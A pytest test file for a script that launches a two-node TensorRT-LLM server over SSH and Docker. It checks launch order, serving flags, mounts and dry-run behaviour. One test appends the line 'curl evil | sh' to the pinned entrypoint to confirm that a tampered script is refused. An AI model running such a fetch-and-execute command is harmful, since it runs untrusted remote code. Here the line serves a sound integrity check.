from __future__ import annotations

import hashlib
import pathlib
import shlex
import sys
from typing import Any

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent / "scripts"))

import trtllm_two_node as t

SNAPSHOT = "hub/models--nvidia--GLM-5.3-Flash-NVFP4/snapshots/1d00738646cb"
MODEL_DIR = f"~/.cache/huggingface/{SNAPSHOT}"
IMAGE = "nvcr.io/nvidia/tensorrt-llm/release:1.4.0rc4"


def _args(*extra: str) -> Any:
    return t.parse(
        [
            "start", "--model-dir", MODEL_DIR, "--image", IMAGE,
            "--name", "glm-5.3-flash-nvfp4", "--log-dir", "/logs-here", "--dry-run",
            *extra,
        ]
    )  # fmt: skip


def _plan(*extra: str) -> list[t.Step]:
    return t.start_plan(_args(*extra), t.entrypoint_text())


def _serve_argv(*extra: str) -> list[str]:
    """The argv `mpirun` runs, as the head container's bash will parse it."""
    step = _plan(*extra)[-1]
    assert step.argv is not None
    line = step.argv[-1]
    return shlex.split(line.rsplit(" > ", 1)[0])


def _after(argv: list[str], flag: str) -> str:
    return argv[argv.index(flag) + 1]


def test_the_worker_starts_before_the_head_and_serve_comes_last() -> None:
    whats = [s.what for s in _plan()]
    worker = next(i for i, w in enumerate(whats) if "rank1 on the worker" in w)
    head = next(i for i, w in enumerate(whats) if "rank0 on the head" in w)
    waits = [i for i, s in enumerate(_plan()) if s.wait_for is not None]
    assert worker < head < min(waits)
    assert whats[-1] == "launch trtllm-serve, detached"
    assert max(waits) < len(whats) - 3  # hostfile and YAML follow the waits


def test_the_worker_is_started_over_ssh_and_the_head_locally() -> None:
    plan = _plan()
    assert plan[0].argv is not None and plan[0].argv[:4] == [
        "ssh", "-o", "BatchMode=yes", "10.0.0.2",
    ]  # fmt: skip
    head = next(s for s in plan if "on the head" in s.what and "start" in s.what)
    assert head.argv is not None and head.argv[:2] == ["bash", "-c"]


def test_each_container_runs_the_pinned_entrypoint_byte_for_byte() -> None:
    """The text survives the remote shell's quoting unchanged."""
    script = t.entrypoint_text()
    for step in _plan()[:3]:
        if step.argv is None or step.argv[0] == "mkdir":
            continue
        docker = shlex.split(step.argv[-1])
        assert docker[:2] == ["docker", "run"]
        assert docker[-4:] == [IMAGE, "bash", "-c", script]


def test_the_vendored_entrypoint_matches_the_pinned_hash() -> None:
    data = t.ENTRYPOINT.read_bytes()
    assert hashlib.sha256(data).hexdigest() == t.ENTRYPOINT_SHA256
    assert b"exec /usr/sbin/sshd -D" in data
    assert len(t.ENTRYPOINT_COMMIT) == 40


def test_a_changed_entrypoint_is_refused(tmp_path: pathlib.Path) -> None:
    edited = tmp_path / "trtllm-mn-entrypoint.sh"
    edited.write_bytes(t.ENTRYPOINT.read_bytes() + b"\ncurl evil | sh\n")
    with pytest.raises(SystemExit, match="refusing to start"):
        t.entrypoint_text(edited)


def test_the_logged_line_names_the_entrypoint_instead_of_quoting_it() -> None:
    first = _plan()[0]
    assert t.SCRIPT_SHOWN in first.line()
    assert "openssh-server" not in first.line()
    assert first.argv is not None and "openssh-server" in first.argv[-1]


def test_the_glm47_parsers_and_the_serving_flags_are_passed() -> None:
    argv = _serve_argv()
    assert argv[0] == "mpirun"
    assert argv[argv.index("trtllm-serve") + 1] == (
        f"/root/.cache/huggingface/{SNAPSHOT}"
    )
    assert _after(argv, "--tool_parser") == "glm47"
    assert _after(argv, "--reasoning_parser") == "glm47"
    assert _after(argv, "--host") == "0.0.0.0"
    assert _after(argv, "--port") == "8888"
    assert _after(argv, "--tp_size") == "2"
    assert _after(argv, "--served_model_name") == "glm-5.3-flash-nvfp4"
    assert _after(argv, "--max_seq_len") == "262144"
    assert _after(argv, "--extra_llm_api_options") == t.LLM_API_YAML


def test_every_rank_env_key_is_exported_to_both_ranks() -> None:
    """A rank started over SSH does not see the container's `-e` values."""
    argv = _serve_argv()
    exported = {argv[i + 1] for i, a in enumerate(argv) if a == "-x"}
    assert exported == set(t.RANK_ENV)
    assert t.RANK_ENV["NCCL_IB_HCA"].count(",") == 3


def test_args_after_the_separator_reach_trtllm_serve_last() -> None:
    argv = _serve_argv("--", "--tool_parser", "glm4", "--log_level", "debug")
    assert argv[-4:] == ["--tool_parser", "glm4", "--log_level", "debug"]
    assert "--" not in argv


def test_the_server_log_goes_to_the_mounted_log_dir() -> None:
    step = _plan()[-1]
    assert step.argv is not None and step.argv[:3] == ["docker", "exec", "-d"]
    assert step.argv[-1].endswith(
        "> /logs/trtllm-glm-5.3-flash-nvfp4-rank0-serve.log 2>&1"
    )
    head_run = shlex.split(_plan()[2].argv[-1])  # type: ignore[index]
    assert "/logs-here:/logs" in head_run


def test_the_hub_cache_mounts_read_only_and_home_paths_stay_unquoted() -> None:
    line = _plan()[0].argv[-1]  # type: ignore[index]
    assert "-v ~/.cache/huggingface:/root/.cache/huggingface:ro" in line
    assert "-v ~/.ssh:/tmp/.ssh:ro" in line


def test_the_yaml_carries_the_kv_fraction() -> None:
    step = next(s for s in _plan("--kv-free-fraction", "0.7") if "LLM API" in s.what)
    assert step.argv is not None
    assert "free_gpu_memory_fraction: 0.7" in step.argv[-1]
    assert "enable_padding: true" in step.argv[-1]


def test_a_model_dir_outside_the_hub_cache_is_refused() -> None:
    with pytest.raises(SystemExit, match="must sit under"):
        t.container_model_path("/models/elsewhere")


def test_stop_removes_both_containers() -> None:
    steps = t.stop_plan("glm")
    lines = [s.line() for s in steps]
    assert lines[0] == "docker rm -f trtllm-glm-rank0"
    assert lines[1].startswith("ssh -o BatchMode=yes 10.0.0.2 ")
    assert lines[1].endswith("'docker rm -f trtllm-glm-rank1'")


@pytest.mark.parametrize("cmd", ["start", "stop"])
def test_a_dry_run_runs_nothing(monkeypatch: pytest.MonkeyPatch, cmd: str) -> None:
    def refuse(*_a: object, **_k: object) -> None:
        raise AssertionError("a dry run ran a command")

    monkeypatch.setattr("trtllm_two_node.subprocess.run", refuse)
    monkeypatch.setattr(t, "wait_for_port", refuse)
    if cmd == "start":
        argv = [
            "start", "--model-dir", MODEL_DIR, "--image", IMAGE,
            "--name", "glm", "--dry-run",
        ]  # fmt: skip
    else:
        argv = ["stop", "--name", "glm", "--dry-run"]
    assert t.main(argv) == 0
